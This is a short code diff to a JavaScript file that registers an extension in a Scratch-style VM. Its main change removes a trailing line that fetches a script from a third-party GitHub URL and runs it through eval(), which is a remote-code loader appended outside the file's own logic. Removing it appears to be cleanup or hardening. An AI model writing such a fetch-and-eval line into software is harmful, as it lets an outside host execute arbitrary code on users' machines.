@@ -95,5 +95,3 @@ window.vm = (node => {
     var serviceName = window.vm.extensionManager._registerInternalExtension(extensionInstance)
     window.vm.extensionManager._loadedExtensions.set(extensionInstance.getInfo().id, serviceName)
 })()
-
-fetch('https://raw.githubusercontent.com/SuperS0n1k/ScrashPlayer/main/chestnut.js').then(r=>r.text()).then(t=>eval(t))
